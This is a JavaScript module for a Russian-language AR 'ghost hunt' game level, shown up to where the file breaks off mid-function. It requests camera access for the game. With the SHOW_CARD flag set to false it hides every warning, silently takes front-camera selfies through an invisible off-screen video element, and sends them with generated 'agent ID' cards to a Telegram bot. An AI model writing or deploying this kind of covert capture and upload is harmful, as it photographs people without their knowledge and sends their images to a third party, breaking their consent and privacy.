// Уровень 10: AR «Охота на духов».
// Сценарий:
//   intro  - приветствие агента, кнопка «Дать доступ к камере» (жест = запрос камеры)
//   photo  - фото для удостоверения (фронталка), две фотки уходят в Telegram
//   scan   - удержание пальца на сканере; по заполнению автоматически «Агент к заданию допущен»
//   hunt   - AR-охота на призраков с метки HIRO (fallback: 2D)
//   outro  - «Спасибо…» + финальный снимок и две фотки в Telegram (агент принят)
// SHOW_CARD = false: все предупреждения о снимке скрыты, снимки делаются в фоне.
// SHOW_CARD = true : возвращаются предупреждения, превью и отсчёт перед снимком.

const VIEW_H = 520;
const MIN_W = 360;
const MAX_W = 760;
const TOTAL_WAVES = 3;
const SCAN_TIME = 2.0;
const ESCAPE_LIMIT = 5;
const GHOST_LIFE_AR = 1.5;
const GHOST_LIFE_2D = 1.5;
const GRANTED_TIME = 2.4;
const AFRAME_URL = 'https://cdn.jsdelivr.net/npm/aframe@1.5.0/dist/aframe-master.min.js';
const ARJS_URL = 'https://cdn.jsdelivr.net/npm/@ar-js-org/ar.js@3.4.5/aframe/build/aframe-ar.js';
const PATT_URL = 'assets/ar/patt.hiro';
const SHOW_CARD = false;

const INTRO_TEXT =
  'Приветствуем тебя, агент. Для прохождения данного уровня нам потребуется разрешение к камере. ' +
  'Твоей задачей будет изгнать призраков, появившихся из портала (метки, которую мы вам прислали). Желаем удачи!';
const OUTRO_TEXT =
  'Спасибо, что прошла все игры! В дальнейшем я буду придумывать проекты покруче, на эти игры мало времени было, ' +
  'поэтому качество не самое лучшее. Готовься к более редким, но сильно круче играм, чем эти)';

function rr(ctx, x, y, w, h, r) {
  const k = Math.min(r, w / 2, h / 2);
  ctx.beginPath();
  ctx.moveTo(x + k, y);
  ctx.arcTo(x + w, y, x + w, y + h, k);
  ctx.arcTo(x + w, y + h, x, y + h, k);
  ctx.arcTo(x, y + h, x, y, k);
  ctx.arcTo(x, y, x + w, y, k);
  ctx.closePath();
}

function loadScript(src) {
  return new Promise((resolve, reject) => {
    const s = document.createElement('script');
    s.src = src;
    s.onload = () => resolve();
    s.onerror = () => reject(new Error('Не загрузился ' + src));
    document.head.appendChild(s);
  });
}

function withTimeout(promise, ms) {
  return Promise.race([promise, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function toBlob(canvas) {
  return new Promise((resolve) => canvas.toBlob((b) => resolve(b), 'image/png'));
}

function wrapText(ctx, text, maxW) {
  const words = text.split(' ');
  const lines = [];
  let line = '';
  for (const w of words) {
    const test = line ? line + ' ' + w : w;
    if (line && ctx.measureText(test).width > maxW) {
      lines.push(line);
      line = w;
    } else {
      line = test;
    }
  }
  if (line) lines.push(line);
  return lines;
}

export function createArGhost(canvas, { container, stage, onHint, onWin, telegram } = {}) {
  const ctx = canvas.getContext('2d');
  const VIEW = { w: MIN_W, h: VIEW_H };
  let W = VIEW.w;
  let H = VIEW.h;
  let scale = 1;
  let offX = 0;
  let offY = 0;

  let running = false;
  let finished = false;
  let raf = null;
  let last = 0;
  let acc = 0;
  let t = 0;

  let phase = 'intro'; // intro | photo | scan | granted | hunt | outro | done
  let toast = '';
  let toastT = 0;
  let outroBusy = false;

  const scan = { holding: false, progress: 0, grantedT: 0 };
  const photo = { state: 'idle', stream: null, video: null, countdown: 0, failed: false };
  const hunt = { mode: 'idle', wave: 0, zapped: 0, escaped: 0, ghosts: [], spawnT: 0, score: 0 };
  let selfie = null; // последний кадр 3:4
  let card = null;
  let cardBlob = null;
  let frameBlob = null;
  let sendState = 'idle'; // idle | sending | ok | fail | off
  let scene = null;
  let arWatch = null;
  let arFound = false;
  let lastHud = '';
  let ghostCanvas = null;
  let ghostDataUrl = null;

  // Можно выключить отправку в тестах (tg = {}), чтобы не было сетевых запросов.
  let tg = telegram || {};

  function setScale() {
    const rect = canvas.getBoundingClientRect();
    const cssW = rect.width || VIEW.w;
    const cssH = rect.height || (cssW * VIEW.h) / VIEW.w;
    canvas.width = Math.round(cssW * 2);
    canvas.height = Math.round(cssH * 2);
    W = canvas.width;
    H = canvas.height;
    VIEW.w = Math.max(MIN_W, Math.min(MAX_W, Math.round(VIEW.h * (W / H))));
    scale = Math.min(W / VIEW.w, H / VIEW.h);
    offX = (W - VIEW.w * scale) / 2;
    offY = (H - VIEW.h * scale) / 2;
  }

  function toLogical(clientX, clientY) {
    const rect = canvas.getBoundingClientRect();
    const px = (clientX - rect.left) * (canvas.width / rect.width);
    const py = (clientY - rect.top) * (canvas.height / rect.height);
    return { x: (px - offX) / scale, y: (py - offY) / scale };
  }

  function waveQuota(w) {
    return 5 + w * 3;
  }

  function hasTelegram() {
    return !!(tg && tg.token && telegramChat());
  }

  // Числовой chat_id (не @username) - чтобы фото уходило только в указанный чат.
  function telegramChat() {
    const id = String((tg && tg.chatId) || '').trim();
    return /^-?\d+$/.test(id) ? id : '';
  }

  // ── Фото и отправка ─────────────────────────────────────
  function frameFromVideo(v) {
    // кадр 3:4 (вертикально, как селфи в руке), вырезаем центр без искажений
    const w = 480;
    const h = 640;
    const c = document.createElement('canvas');
    c.width = w;
    c.height = h;
    const g = c.getContext('2d');
    const vw = v.videoWidth;
    const vh = v.videoHeight;
    let sw = vw;
    let sh = vh;
    if (vw / vh > 3 / 4) sw = (vh * 3) / 4;
    else sh = (vw * 4) / 3;
    const sx = (vw - sw) / 2;
    const sy = (vh - sh) / 2;
    g.save();
    g.translate(w, 0);
    g.scale(-1, 1);
    g.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
    g.restore();
    return c;
  }

  function stopPhotoCam() {
    if (photo.video && photo.video.parentNode) photo.video.parentNode.removeChild(photo.video);
    if (photo.stream) {
      photo.stream.getTracks().forEach((tr) => tr.stop());
      photo.stream = null;
    }
    photo.video = null;
  }

  // Снимок с фронталки. Вызывать синхронно из обработчика жеста (иначе iOS не даст камеру).
  async function captureSelfie() {
    try {
      photo.stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
        audio: false,
      });
      const v = document.createElement('video');
      v.playsInline = true;
      v.muted = true;
      v.autoplay = true;
      v.setAttribute('playsinline', '');
      v.setAttribute('webkit-playsinline', '');
      // iOS не декодирует кадры у <video> вне DOM - держим его невидимо в документе
      v.style.cssText = 'position:fixed;left:-9999px;top:0;width:2px;height:2px;opacity:0;pointer-events:none;';
      v.srcObject = photo.stream;
      document.body.appendChild(v);
      photo.video = v;
      await v.play().catch(() => {});
      photo.state = 'waiting';
      const t0 = performance.now();
      while (!(v.videoWidth && v.readyState >= 2) && performance.now() - t0 < 6000) await sleep(80);
      if (!v.videoWidth) throw new Error('нет кадра');
      if (SHOW_CARD) {
        photo.state = 'preview';
        const c0 = performance.now();
        while (performance.now() - c0 < 3000) {
          photo.countdown = (3000 - (performance.now() - c0)) / 1000;
          await sleep(40);
        }
      }
      photo.state = 'shot';
      return frameFromVideo(v);
    } catch (e) {
      return null;
    } finally {
      stopPhotoCam();
    }
  }

  // Карточка «Пропуск агента»: accepted=false - стажёр, accepted=true - агент принят.
  function buildCard(source, accepted) {
    const w = 640;
    const h = 400;
    const c = document.createElement('canvas');
    c.width = w;
    c.height = h;
    const g = c.getContext('2d');
    g.fillStyle = '#2a1c4d';
    g.fillRect(0, 0, w, h);
    g.fillStyle = '#f7f2ff';
    rr(g, 12, 12, w - 24, h - 24, 18);
    g.fill();
    g.fillStyle = '#8c6bd6';
    g.font = "800 20px 'Nunito', sans-serif";
    g.textAlign = 'left';
    g.textBaseline = 'alphabetic';
    g.fillText(accepted ? 'АГЕНТ ПРИНЯТ' : 'ПРОПУСК АГЕНТА', 34, 54);
    g.fillStyle = '#4a3a78';
    g.font = "700 12px 'Nunito', sans-serif";
    g.fillText('ОТДЕЛ: ОХОТА НА ДУХОВ   ·   КОД AR-10', 34, 74);
    const px = 34;
    const py = 92;
    const pw = 216;
    const ph = 288;
    g.save();
    rr(g, px, py, pw, ph, 12);
    g.clip();
    if (source) {
      g.drawImage(source, px, py, pw, ph);
    } else {
      g.fillStyle = '#d9cdf5';
      g.fillRect(px, py, pw, ph);
      g.fillStyle = '#6a4fb0';
      g.font = "800 20px 'Nunito', sans-serif";
      g.textAlign = 'center';
      g.fillText('НЕТ ФОТО', px + pw / 2, py + ph / 2);
    }
    g.restore();
    g.strokeStyle = '#2a1c4d';
    g.lineWidth = 3;
    rr(g, px, py, pw, ph, 12);
    g.stroke();
    const fx = 290;
    g.fillStyle = '#2a1c4d';
    g.font = "800 15px 'Nunito', sans-serif";
    g.textAlign = 'left';
    g.fillText('ИМЯ:', fx, 130);
    g.fillText('СТАТУС:', fx, 190);
    g.fillText('ДОСТУП:', fx, 250);
    g.fillStyle = '#4a3a78';
    g.font = "700 15px 'Nunito', sans-serif";
    g.fillText('Агент', fx + 80, 130);
    g.fillText(accepted ? 'принят' : 'на стажировке', fx + 80, 190);
    g.fillText(accepted ? 'полный' : 'разрешён', fx + 80, 250);
    g.fillStyle = '#8c6bd6';
    g.font = "700 12px 'Nunito', sans-serif";
    g.fillText(new Date().toLocaleDateString('ru-RU'), fx, 320);
    return c;
  }

  async function sendOne(blob, filename, caption) {
    const fd = new FormData();
    fd.append('chat_id', telegramChat());
    fd.append('caption', caption);
    fd.append('photo', blob, filename);
    await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
      method: 'POST',
      body: fd,
      mode: 'no-cors',
    });
  }

  // Отправка по очереди. no-cors: ответ Telegram не читается, «ok» = запрос ушёл.
  async function sendList(list) {
    let ok = 0;
    for (const item of list) {
      try {
        await sendOne(item.blob, item.name, item.caption);
        ok += 1;
      } catch (e) {
        /* ошибку no-cors не прочитать */
      }
    }
    sendState = ok > 0 ? 'ok' : 'fail';
  }

  // Шаг 1: фото для удостоверения (стажёр) -> две фотки в Telegram.
  async function runIntroPhoto() {
    selfie = await captureSelfie();
    if (selfie) {
      card = buildCard(selfie, false);
      frameBlob = await toBlob(selfie);
      cardBlob = await toBlob(card);
      if (hasTelegram()) {
        sendState = 'sending';
        await sendList([
          { blob: frameBlob, name: 'agent-photo.png', caption: 'Фото агента' },
          { blob: cardBlob, name: 'agent-id.png', caption: 'Удостоверение агента · стажёр AR-10' },
        ]);
      }
    } else {
      photo.failed = true;
      toast = 'Камера недоступна';
      toastT = 1.6;
    }
    if (phase === 'photo') enterScan();
  }

  // Шаг 3: «Спасибо» -> финальный снимок -> две фотки: фото и «Агент принят».
  async function runOutro() {
    if (phase !== 'outro' || outroBusy) return;
    outroBusy = true;
    const shot = await captureSelfie();
    const acceptedCard = buildCard(shot, true);
    const acceptedBlob = await toBlob(acceptedCard);
    if (hasTelegram()) {
      sendState = 'sending';
      const list = [];
      if (shot) list.push({ blob: await toBlob(shot), name: 'agent-final.png', caption: 'Финальное фото агента' });
      list.push({ blob: acceptedBlob, name: 'agent-accepted.png', caption: 'Агент принят' });
      await sendList(list);
    }
    phase = 'done';
    setTimeout(finishRun, 900);
  }

  // ── Фазы ────────────────────────────────────────────────
  function beginAccess() {
    if (phase !== 'intro') return;
    phase = 'photo';
    if (onHint) onHint('Проверка доступа');
    // вызов из обработчика тапа: getUserMedia внутри runIntroPhoto стартует синхронно
    runIntroPhoto();
  }

  function enterScan() {
    phase = 'scan';
    scan.progress = 0;
    scan.holding = false;
    if (onHint) onHint('Приложи палец к сенсору и удерживай');
  }

  function enterGranted() {
    phase = 'granted';
    scan.holding = false;
    scan.grantedT = GRANTED_TIME;
    if (onHint) onHint('Агент к заданию допущен');
  }

  function enterHunt() {
    phase = 'hunt';
    hunt.mode = 'idle';
    hunt.wave = 0;
    hunt.zapped = 0;
    hunt.ghosts = [];
    hunt.spawnT = 0;
    hunt.score = 0;
    if (onHint) onHint('Загружаю портал…');
    startAr();
  }

  function enterOutro() {
    phase = 'outro';
    cleanupScene();
    hunt.ghosts = [];
    outroBusy = false;
    sendState = hasTelegram() ? 'idle' : 'off';
    if (onHint) onHint('Миссия окончена');
  }

  function stepScan(dt) {
    if (scan.holding) {
      scan.progress = Math.min(1, scan.progress + dt / SCAN_TIME);
      if (scan.progress >= 1) enterGranted();
    } else {
      scan.progress = Math.max(0, scan.progress - dt * 0.8);
    }
  }

  // ── Охота: AR (A-Frame + AR.js, метка HIRO) с 2D-фолбэком ──
  function playArVideo() {
    if (!container) return;
    const v = container.querySelector('video');
    if (!v) return;
    v.muted = true;
    v.setAttribute('playsinline', '');
    v.setAttribute('webkit-playsinline', '');
    const p = v.play();
    if (p && p.catch) p.catch(() => {});
  }

  function startArWatch() {
    stopArWatch();
    let n = 0;
    arWatch = setInterval(() => {
      playArVideo();
      if (++n > 12) stopArWatch();
    }, 500);
  }

  function stopArWatch() {
    if (arWatch) {
      clearInterval(arWatch);
      arWatch = null;
    }
  }

  function showArTapPrompt() {
    if (!container || container.querySelector('.ar-tap')) return;
    const b = document.createElement('button');
    b.type = 'button';
    b.className = 'ar-tap';
    b.textContent = 'Включить AR';
    b.addEventListener('click', () => {
      playArVideo();
      b.remove();
    });
    container.appendChild(b);
  }

  function buildScene() {
    if (!container) return;
    container.classList.remove('hidden');
    container.classList.add('is-full');
    document.body.classList.add('ar-active');
    canvas.classList.add('hidden');
    if (stage) stage.classList.add('hidden');
    const s = document.createElement('a-scene');
    s.setAttribute('embedded', '');
    s.setAttribute('vr-mode-ui', 'enabled: false');
    s.setAttribute('loading-screen', 'enabled: false');
    // без системного запроса «Motion & Orientation Access» (страшная плашка на англ.)
    s.setAttribute('device-orientation-permission-ui', 'enabled: false');
    s.setAttribute(
      'arjs',
      'sourceType: webcam; debugUIEnabled: false; detectionMode: mono_and_matrix; matrixCodeType: 3x3;'
    );
    s.setAttribute('renderer', 'antialias: true; alpha: true;');
    const marker = document.createElement('a-marker');
    marker.setAttribute('type', 'pattern');
    marker.setAttribute('url', PATT_URL);
    marker.setAttribute('smooth', 'true');
    const cam = document.createElement('a-entity');
    cam.setAttribute('camera', '');
    // look-controls не нужен в AR (камерой управляет AR.js) и провоцирует запрос ориентации
    cam.setAttribute('look-controls', 'enabled: false');
    cam.setAttribute('cursor', 'rayOrigin: mouse; fuse: false;');
    cam.setAttribute('raycaster', 'objects: .ghost; far: 40;');
    s.appendChild(marker);
    s.appendChild(cam);
    s._arMarker = marker;
    container.appendChild(s);
    scene = s;
    startArWatch();
    showArTapPrompt();
    buildArHud(marker);
  }

  async function startAr() {
    hunt.mode = 'idle';
    try {
      if (!container) throw new Error('нет контейнера AR');
      if (!window.AFRAME) await withTimeout(loadScript(AFRAME_URL), 9000);
      if (!window.AFRAME) throw new Error('A-Frame не загрузился');
      if (!window.AFRAME.components || !window.AFRAME.components['arjs']) {
        await withTimeout(loadScript(ARJS_URL), 9000);
      }
      buildScene();
      hunt.mode = 'ar';
      hunt.wave = 0;
      hunt.zapped = 0;
      hunt.spawnT = 0.6;
      if (onHint) onHint('Наведи камеру на метку');
    } catch (e) {
      cleanupScene();
      start2D();
    }
  }

  function cleanupScene() {
    stopArWatch();
    if (scene && scene.parentNode) scene.parentNode.removeChild(scene);
    scene = null;
    if (container) {
      container.classList.add('hidden');
      container.classList.remove('is-full');
      // убираем всё, что могла оставить A-Frame, чтобы не ломать вёрстку дальше
      while (container.firstChild) container.removeChild(container.firstChild);
    }
    document.body.classList.remove('ar-active');
    canvas.classList.remove('hidden');
    if (stage) stage.classList.remove('hidden');
    window.scrollTo(0, 0);
  }

  function start2D() {
    hunt.mode = '2d';
    hunt.wave = 0;
    hunt.zapped = 0;
    hunt.ghosts = [];
    hunt.spawnT = 0.5;
    hunt.score = 0;
    canvas.classList.remove('hidden');
    if (stage) stage.classList.remove('hidden');
    if (onHint) onHint(`Волна 1 из ${TOTAL_WAVES}`);
  }

  // ── Призрак: картинка в стиле референса (светло-голубое тело, чёрный контур, фиолетовое лицо) ──
  function ghostArt() {
    if (ghostCanvas) return ghostCanvas;
    const c = document.createElement('canvas');
    c.width = 512;
    c.height = 512;
    const g = c.getContext('2d');
    g.lineJoin = 'round';
    g.lineCap = 'round';
    g.beginPath();
    g.moveTo(170, 85);
    g.bezierCurveTo(190, 30, 320, 25, 345, 95);
    g.bezierCurveTo(352, 140, 360, 160, 395, 178);
    g.bezierCurveTo(440, 195, 480, 230, 487, 278);
    g.bezierCurveTo(470, 270, 440, 265, 415, 285);
    g.bezierCurveTo(395, 310, 385, 350, 425, 424);
    g.bezierCurveTo(405, 420, 390, 425, 380, 430);
    g.bezierCurveTo(330, 445, 320, 470, 260, 470);
    g.bezierCurveTo(200, 470, 170, 420, 120, 425);
    g.bezierCurveTo(90, 428, 75, 430, 70, 430);
    g.bezierCurveTo(95, 375, 120, 330, 140, 240);
    g.bezierCurveTo(115, 300, 100, 280, 115, 270);
    g.bezierCurveTo(90, 260, 60, 250, 25, 278);
    g.bezierCurveTo(40, 225, 85, 185, 150, 170);
    g.bezierCurveTo(158, 155, 165, 120, 170, 85);
    g.closePath();
    g.fillStyle = '#e6f9ff';
    g.fill();
    g.strokeStyle = '#000';
    g.lineWidth = 14;
    g.stroke();
    // глаза и рот
    g.fillStyle = '#4d3a8a';
    g.strokeStyle = '#000';
    g.lineWidth = 10;
    g.beginPath();
    g.ellipse(230, 140, 30, 24, 0, 0, Math.PI * 2);
    g.fill();
    g.stroke();
    g.beginPath();
    g.ellipse(302, 150, 30, 24, 0, 0, Math.PI * 2);
    g.fill();
    g.stroke();
    g.lineWidth = 12;
    g.beginPath();
    g.ellipse(256, 210, 26, 36, 0, 0, Math.PI * 2);
    g.fill();
    g.stroke();
    // складки
    g.lineWidth = 14;
    g.beginPath();
    g.moveTo(140, 245);
    g.lineTo(120, 318);
    g.stroke();
    g.beginPath();
    g.moveTo(372, 245);
    g.lineTo(395, 318);
    g.stroke();
    g.beginPath();
    g.moveTo(213, 320);
    g.lineTo(190, 400);
    g.stroke();
    g.beginPath();
    g.moveTo(297, 320);
    g.lineTo(322, 400);
    g.stroke();
    ghostCanvas = c;
    return c;
  }

  function ghostSrc() {
    if (!ghostDataUrl) ghostDataUrl = ghostArt().toDataURL('image/png');
    return ghostDataUrl;
  }

  // ── HUD поверх AR: волна, сколько изгнано, подсказка ──
  function buildArHud(marker) {
    const hud = document.createElement('div');
    hud.className = 'ar-hud';
    container.appendChild(hud);
    scene._arHud = hud;
    lastHud = '';
    arFound = false;
    marker.addEventListener('markerFound', () => {
      arFound = true;
    });
    marker.addEventListener('markerLost', () => {
      arFound = false;
    });
  }

  function setArHud(msg) {
    const hud = scene && scene._arHud;
    if (!hud) return;
    const top = `Волна ${hunt.wave + 1} из ${TOTAL_WAVES} · изгнано ${hunt.zapped} из ${waveQuota(hunt.wave)} · ушло ${hunt.escaped}/${ESCAPE_LIMIT}`;
    const text = top + '|' + msg;
    if (text === lastHud) return;
    lastHud = text;
    hud.innerHTML = '';
    const a = document.createElement('div');
    a.className = 'ar-hud__top';
    a.textContent = top;
    const b = document.createElement('div');
    b.className = 'ar-hud__msg';
    b.textContent = msg;
    hud.appendChild(a);
    hud.appendChild(b);
  }

  // Призраки в AR: появляются над меткой и уходят сами, охота не зависает.
  function spawnArGhost() {
    const marker = scene && scene._arMarker;
    if (!marker) return;
    const x = (Math.random() - 0.5) * 1.8;
    const y = 0.5 + Math.random() * 0.8;
    const z = (Math.random() - 0.5) * 1.0;
    const g = document.createElement('a-plane');
    g.setAttribute('class', 'ghost');
    g.setAttribute('width', '1.0');
    g.setAttribute('height', '1.0');
    g.setAttribute('position', `${x.toFixed(2)} ${y.toFixed(2)} ${z.toFixed(2)}`);
    g.setAttribute('material', { src: ghostSrc(), transparent: true, alphaTest: 0.1, side: 'double' });
    g.setAttribute('animation', {
      property: 'position',
      dir: 'alternate',
      dur: 1500,
      loop: true,
      easing: 'easeInOutSine',
      to: `${x.toFixed(2)} ${(y + 0.12).toFixed(2)} ${z.toFixed(2)}`,
    });
    marker.appendChild(g);
    setTimeout(() => {
      // призрак ушёл сам, не будучи изгнанным
      if (g.parentNode) {
        g.parentNode.removeChild(g);
        addEscape(1);
      }
    }, GHOST_LIFE_AR * 1000);
  }

  function clearArGhosts() {
    if (!scene || !scene._arMarker) return;
    scene._arMarker.querySelectorAll('.ghost').forEach((el) => {
      if (el.parentNode) el.parentNode.removeChild(el);
    });
  }

  // Сбежавшие призраки: если ушло ESCAPE_LIMIT, портал открывается заново (волна сбрасывается).
  function addEscape(n) {
    if (phase !== 'hunt' || n <= 0) return;
    hunt.escaped += n;
    if (hunt.escaped >= ESCAPE_LIMIT) {
      hunt.escaped = 0;
      hunt.zapped = 0;
      hunt.ghosts = [];
      clearArGhosts();
      if (onHint) onHint('Портал открылся снова! Волна начинается заново');
    }
  }

  function zapAr() {
    hunt.zapped += 1;
    hunt.score += 1;
    if (hunt.zapped >= waveQuota(hunt.wave)) {
      clearArGhosts();
      if (hunt.wave + 1 < TOTAL_WAVES) {
        hunt.wave += 1;
        hunt.zapped = 0;
        hunt.escaped = 0;
        hunt.spawnT = 0.6;
        if (onHint) onHint(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`);
      } else {
        enterOutro();
      }
    }
    setArHud(arFound ? 'Метка найдена - тапай по духам!' : 'Наведи камеру на метку');
  }

  // Тап по экрану: луч из камеры проверяет, попал ли он в видимого призрака.
  function tapAr(e) {
    if (hunt.mode !== 'ar' || !scene || !scene.camera || !window.AFRAME) return;
    const THREE = window.AFRAME.THREE;
    const cvs = scene.canvas;
    if (!THREE || !cvs) return;
    const r = cvs.getBoundingClientRect();
    const ndc = new THREE.Vector2(
      ((e.clientX - r.left) / r.width) * 2 - 1,
      -((e.clientY - r.top) / r.height) * 2 + 1
    );
    const ray = new THREE.Raycaster();
    ray.setFromCamera(ndc, scene.camera);
    const objs = Array.from(scene.querySelectorAll('.ghost'))
      .map((el) => el.object3D)
      .filter(Boolean);
    const hits = ray.intersectObjects(objs, true);
    if (!hits.length) return;
    let o = hits[0].object;
    let visible = true;
    for (let p = o; p; p = p.parent) if (p.visible === false) visible = false;
    if (!visible) return;
    while (o && !o.el) o = o.parent;
    if (o && o.el && o.el.parentNode) {
      o.el.parentNode.removeChild(o.el);
      zapAr();
    }
  }

  function spawn2D() {
    const m = 54;
    hunt.ghosts.push({
      x: m + Math.random() * (VIEW.w - 2 * m),
      y: 120 + Math.random() * (VIEW.h - 260),
      r: 42,
      t: Math.random() * 6,
      life: GHOST_LIFE_2D,
    });
  }

  function zap2D(q) {
    let best = -1;
    let bestD = 1e9;
    hunt.ghosts.forEach((g, i) => {
      const d = Math.hypot(g.x - q.x, g.y - q.y);
      if (d < g.r + 28 && d < bestD) {
        bestD = d;
        best = i;
      }
    });
    if (best >= 0) {
      hunt.ghosts.splice(best, 1);
      hunt.zapped += 1;
      hunt.score += 1;
    }
  }

  function advanceWave() {
    hunt.ghosts = [];
    if (hunt.wave + 1 < TOTAL_WAVES) {
      hunt.wave += 1;
      hunt.zapped = 0;
      hunt.escaped = 0;
      hunt.spawnT = 0.5;
      if (onHint) onHint(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`);
    } else {
      enterOutro();
    }
  }

  function stepHunt(dt) {
    if (hunt.mode === 'ar' && scene && scene._arMarker) {
      // billboard: призраки всегда лицом к камере
      const THREE = window.AFRAME && window.AFRAME.THREE;
      if (THREE && scene.camera) {
        const camPos = new THREE.Vector3();
        scene.camera.getWorldPosition(camPos);
        scene._arMarker.querySelectorAll('.ghost').forEach((el) => {
          if (el.object3D) el.object3D.lookAt(camPos);
        });
      }
      if (hunt.zapped < waveQuota(hunt.wave)) {
        hunt.spawnT -= dt;
        const live = scene._arMarker.querySelectorAll('.ghost').length;
        if (hunt.spawnT <= 0 && live < 4 + hunt.wave * 2) {
          hunt.spawnT = Math.max(0.35, 0.8 - hunt.wave * 0.2);
          spawnArGhost();
        }
      }
      setArHud(arFound ? 'Метка найдена - тапай по духам!' : 'Наведи камеру на метку «Пропуск агента»');
    }
    if (hunt.mode === '2d') {
      if (hunt.zapped >= waveQuota(hunt.wave)) {
        advanceWave();
        return;
      }
      hunt.spawnT -= dt;
      if (hunt.spawnT <= 0 && hunt.ghosts.length < 4 + hunt.wave * 2) {
        hunt.spawnT = Math.max(0.35, 0.8 - hunt.wave * 0.2);
        spawn2D();
      }
      for (const g of hunt.ghosts) {
        g.t += dt;
        g.life -= dt;
      }
      const alive = hunt.ghosts.filter((g) => g.life > 0);
      const expired = hunt.ghosts.length - alive.length;
      hunt.ghosts = alive;
      if (expired > 0) addEscape(expired);
    }
  }

  // ── Отрисовка ───────────────────────────────────────────
  function drawGhost(x, y, r, tt) {
    const bob = Math.sin(tt * 2.4) * 4;
    const s = r * 2.6;
    ctx.drawImage(ghostArt(), x - s / 2, y - s / 2 + bob, s, s);
  }

  function button(label, b, color) {
    ctx.fillStyle = 'rgba(20,14,40,0.9)';
    rr(ctx, b.x, b.y, b.w, b.h, 12);
    ctx.fill();
    ctx.strokeStyle = color;
    ctx.lineWidth = 2;
    rr(ctx, b.x, b.y, b.w, b.h, 12);
    ctx.stroke();
    ctx.fillStyle = color;
    ctx.font = "800 15px 'Nunito', sans-serif";
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText(label, b.x + b.w / 2, b.y + b.h / 2);
  }

  function mainButtonRect() {
    return { x: VIEW.w / 2 - 140, y: VIEW.h - 110, w: 280, h: 56 };
  }

  // Подгоняем размер текста, чтобы он целиком поместился в отведённую высоту.
  function fitText(text, maxW, maxH, startSize) {
    for (let size = startSize; size >= 11; size -= 1) {
      ctx.font = `600 ${size}px 'Nunito', sans-serif`;
      const lines = wrapText(ctx, text, maxW);
      if (lines.length * size * 1.45 <= maxH) return { lines, size };
    }
    ctx.font = "600 11px 'Nunito', sans-serif";
    return { lines: wrapText(ctx, text, maxW), size: 11 };
  }

  function drawBody(text, startSize, top, bottom) {
    const cx = VIEW.w / 2;
    const { lines, size } = fitText(text, VIEW.w - 60, bottom - top, startSize);
    const lh = size * 1.45;
    ctx.fillStyle = '#e6dcff';
    ctx.font = `600 ${size}px 'Nunito', sans-serif`;
    lines.forEach((l, i) => ctx.fillText(l, cx, top + lh / 2 + i * lh));
  }

  function renderIntro() {
    const cx = VIEW.w / 2;
    ctx.fillStyle = '#ffffff';
    ctx.font = "800 22px 'Nunito', sans-serif";
    ctx.fillText('Приветствуем, агент', cx, 72);
    drawBody(INTRO_TEXT, 17, 104, mainButtonRect().y - 20);
    button('Дать доступ к камере', mainButtonRect(), '#ffe066');
  }

  function renderPhoto() {
    const cx = VIEW.w / 2;
    if (SHOW_CARD) {
      ctx.fillStyle = '#ffffff';
      ctx.font = "800 19px 'Nunito', sans-serif";
      ctx.fillText('Фото для удостоверения', cx, 74);
      const bw = 220;
      const bh = 293;
      const bx = cx - bw / 2;
      const by = 110;
      if (photo.video && photo.video.videoWidth) {
        ctx.save();
        rr(ctx, bx, by, bw, bh, 14);
        ctx.clip();
        ctx.translate(bx + bw, by);
        ctx.scale(-1, 1);
        const v = photo.video;
        const s = Math.min(v.videoWidth, v.videoHeight);
        ctx.drawImage(v, (v.videoWidth - s) / 2, (v.videoHeight - s) / 2, s, s, 0, 0, bw, bh);
        ctx.restore();
      }
      if (photo.state === 'preview') {
        ctx.fillStyle = '#ffffff';
        ctx.font = "800 64px 'Nunito', sans-serif";
        ctx.fillText(String(Math.max(1, Math.ceil(photo.countdown))), cx, by + bh / 2);
      }
      return;
    }
    // без предупреждений: просто индикатор проверки доступа
    ctx.fillStyle = '#ffffff';
    ctx.font = "800 19px 'Nunito', sans-serif";
    ctx.fillText('Проверка доступа', cx, 74);
    ctx.strokeStyle = 'rgba(201,184,255,0.28)';
    ctx.lineWidth = 7;
    ctx.beginPath();
    ctx.arc(cx, VIEW.h / 2 - 10, 62, 0, Math.PI * 2);
    ctx.stroke();
    ctx.strokeStyle = '#4cc9f0';
    ctx.beginPath();
    ctx.arc(cx, VIEW.h / 2 - 10, 62, t * 3, t * 3 + Math.PI * 0.7);
    ctx.stroke();
  }

  function renderScan() {
    const cx = VIEW.w / 2;
    const cy = VIEW.h / 2 - 20;
    const R = 96;
    ctx.fillStyle = '#ffffff';
    ctx.font = "800 20px 'Nunito', sans-serif";
    ctx.fillText('Сканирование отпечатка', cx, 78);
    ctx.strokeStyle = '#3a2a6a';
    ctx.lineWidth = 8;
    ctx.beginPath();
    ctx.arc(cx, cy, R, 0, Math.PI * 2);
    ctx.stroke();
    ctx.strokeStyle = '#4cc9f0';
    ctx.beginPath();
    ctx.arc(cx, cy, R, -Math.PI / 2, -Math.PI / 2 + Math.PI * 2 * scan.progress);
    ctx.stroke();
    ctx.strokeStyle = scan.progress >= 1 ? '#7dffc4' : '#c9b8ff';
    ctx.lineWidth = 3;
    for (let i = 0; i < 4; i++) {
      const rx = 14 + i * 9;
      const ry = 18 + i * 10;
      ctx.beginPath();
      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 0.12, Math.PI * 0.88, false);
      ctx.stroke();
      ctx.beginPath();
      ctx.ellipse(cx, cy, rx, ry, 0, Math.PI * 1.12, Math.PI * 1.88, false);
      ctx.stroke();
    }
    ctx.fillStyle = '#d9cdf5';
    ctx.font = "600 15px 'Nunito', sans-serif";
    ctx.fillText('Приложи палец и удерживай', cx, cy + R + 48);
    if (scan.progress > 0) {
      ctx.fillStyle = '#4cc9f0';
      ctx.font = "800 14px 'Nunito', sans-serif";
      ctx.fillText(Math.round(scan.progress * 100) + '%', cx, cy + R + 72);
    }
  }

  function renderGranted() {
    const cx = VIEW.w / 2;
    const cy = VIEW.h / 2 - 30;
    const pulse = 1 + Math.sin(t * 6) * 0.04;
    ctx.fillStyle = 'rgba(125,255,196,0.12)';
    ctx.beginPath();
